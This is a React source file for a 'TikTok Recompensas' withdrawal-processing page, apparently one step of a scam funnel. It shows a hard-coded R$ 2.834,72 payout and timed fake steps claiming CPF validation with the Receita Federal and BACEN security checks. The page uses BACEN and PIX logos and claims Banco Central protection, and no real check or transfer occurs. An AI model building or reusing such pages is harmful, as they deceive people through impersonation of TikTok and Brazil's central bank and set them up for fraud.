import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CheckCircle2, Loader2, Shield, Wifi, CreditCard, UserCheck, BanknoteIcon, ShieldCheck, Clock } from "lucide-react";
import tiktokIcon from "@/assets/tiktok-icon.png";
import bacenLogo from "@/assets/bacen-logo.png";
import pixLogoFull from "@/assets/pix-logo-full.svg";
import coinP from "@/assets/coin-p.png";

interface LocationState {
  pixKey?: string;
  pixKeyType?: string;
}

const steps = [
  { text: "Verificação de identidade recebida", icon: UserCheck, duration: 2200 },
  { text: "Validando dados do CPF na Receita Federal", icon: ShieldCheck, duration: 2600 },
  { text: "Confirmando pagamentos realizados", icon: CreditCard, duration: 2000 },
  { text: "Sincronizando com a sua conta PIX", icon: Wifi, duration: 2800 },
  { text: "Aplicando protocolos de segurança BACEN", icon: Shield, duration: 2200 },
  { text: "Processando seu saque via PIX", icon: BanknoteIcon, duration: 3000 },
  { text: "Finalizando liberação do saldo", icon: Clock, duration: 1800 },
];

const FunnelWithdrawProcessingPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;
  const [currentStep, setCurrentStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [completedSteps, setCompletedSteps] = useState(0);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    let stepIndex = 0;

    const advanceStep = () => {
      if (stepIndex < steps.length) {
        setCurrentStep(stepIndex);
        const duration = steps[stepIndex].duration;
        stepIndex++;
        setTimeout(() => {
          setCompletedSteps(stepIndex);
          advanceStep();
        }, duration);
      } else {
        setTimeout(() => {
          navigate("/funil/sucesso", { state, replace: true });
        }, 1200);
      }
    };

    advanceStep();
  }, [navigate, state]);

  useEffect(() => {
    const totalDuration = steps.reduce((sum, s) => sum + s.duration, 0);
    const startTime = Date.now();

    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min((elapsed / totalDuration) * 100, 100);
      setProgress(pct);
      if (pct >= 100) clearInterval(interval);
    }, 50);

    return () => clearInterval(interval);
  }, []);

  const isComplete = progress >= 100;

  return (
    <div className="min-h-screen bg-black flex flex-col font-['Inter',system-ui,sans-serif]">
      {/* Header - TikTok style */}
      <header className="py-4 px-4 flex items-center justify-center gap-2.5 border-b border-white/10">
        <img src={tiktokIcon} alt="TikTok" className="h-7" />
        <span className="text-white font-bold text-[15px] tracking-tight">TikTok Recompensas</span>
      </header>

      {/* Main */}
      <div className="flex-1 flex flex-col items-center px-5 pt-8 pb-6">
        {/* Coin animation */}
        <div className="relative w-24 h-24 mb-5">
          {/* Glow ring */}
          <div
            className="absolute inset-0 rounded-full opacity-40"
            style={{
              background: "radial-gradient(circle, hsl(349 80% 58% / 0.3) 0%, transparent 70%)",
              animation: "pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite",
            }}
          />
          {/* Spinning ring */}
          <div
            className="absolute inset-0 rounded-full border-2 border-transparent"
            style={{
              borderTopColor: "hsl(349 80% 58%)",
              borderRightColor: "hsl(349 80% 58% / 0.3)",
              animation: isComplete ? "none" : "spin 1.2s linear infinite",
            }}
          />
          {/* Coin */}
          <div className="absolute inset-2 rounded-full bg-gradient-to-br from-gray-800 to-gray-900 flex items-center justify-center border border-white/10 shadow-xl">
            <img src={coinP} alt="" className="w-12 h-12 object-contain" />
          </div>
          {/* Check overlay when done */}
          {isComplete && (
            <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-green-500 flex items-center justify-center border-2 border-black animate-scale-in">
              <CheckCircle2 className="w-5 h-5 text-white" />
            </div>
          )}
        </div>

        <h1 className="text-lg font-bold text-white mb-0.5 text-center">
          {isComplete ? "Saque processado!" : "Processando seu saque"}
        </h1>
        <p className="text-primary text-2xl font-extrabold mb-1 tracking-tight">R$ 2.834,72</p>
        <p className="text-white/40 text-xs mb-6 text-center">
          {isComplete ? "Redirecionando..." : "Aguarde, não feche esta página"}
        </p>

        {/* Progress bar - TikTok red */}
        <div className="w-full max-w-xs mb-7">
          <div className="h-1.5 bg-white/10 rounded-full overflow-hidden">
            <div
              className="h-full rounded-full transition-all duration-100 ease-linear"
              style={{
                width: `${progress}%`,
                background: "linear-gradient(90deg, hsl(349 80% 58%), hsl(349 99% 68%))",
              }}
            />
          </div>
          <div className="flex justify-between mt-1.5">
            <span className="text-[10px] text-white/30">{completedSteps}/{steps.length} etapas</span>
            <span className="text-[10px] text-white/30 font-mono">{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Steps list */}
        <div className="w-full max-w-xs space-y-2.5">
          {steps.map((s, i) => {
            const Icon = s.icon;
            const isDone = i < completedSteps;
            const isActive = i === currentStep && !isComplete;
            const isPending = i > currentStep;

            return (
              <div
                key={i}
                className={`flex items-center gap-3 py-2 px-3 rounded-xl transition-all duration-500 ${
                  isActive
                    ? "bg-white/[0.06] border border-white/10"
                    : isDone
                    ? "bg-transparent"
                    : "bg-transparent opacity-30"
                }`}
                style={{
                  animationDelay: `${i * 100}ms`,
                }}
              >
                <div className={`w-7 h-7 rounded-full flex items-center justify-center shrink-0 transition-all duration-300 ${
                  isDone
                    ? "bg-green-500/20"
                    : isActive
                    ? "bg-primary/20"
                    : "bg-white/5"
                }`}>
                  {isDone ? (
                    <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
                  ) : isActive ? (
                    <Loader2 className="w-3.5 h-3.5 text-primary animate-spin" />
                  ) : (
                    <Icon className="w-3.5 h-3.5 text-white/20" />
                  )}
                </div>
                <span className={`text-[13px] transition-all duration-300 ${
                  isDone
                    ? "text-green-400/80 font-medium"
                    : isActive
                    ? "text-white font-medium"
                    : "text-white/30"
                }`}>
                  {s.text}
                </span>
              </div>
            );
          })}
        </div>

        {/* Trust badges */}
        <div className="mt-auto pt-8 flex flex-col items-center gap-3">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-1.5">
              <img src={bacenLogo} alt="BACEN" className="w-4 h-4 object-contain opacity-40" />
              <span className="text-[10px] text-white/30">BACEN</span>
            </div>
            <div className="w-px h-3 bg-white/10" />
            <div className="flex items-center gap-1.5">
              <img src={pixLogoFull} alt="PIX" className="h-3 opacity-30" />
            </div>
            <div className="w-px h-3 bg-white/10" />
            <div className="flex items-center gap-1.5">
              <Shield className="w-3.5 h-3.5 text-white/20" />
              <span className="text-[10px] text-white/30">Criptografado</span>
            </div>
          </div>
          <p className="text-[10px] text-white/15 text-center">
            Transação protegida por protocolos de segurança do Banco Central
          </p>
        </div>
      </div>
    </div>
  );
};

export default FunnelWithdrawProcessingPage;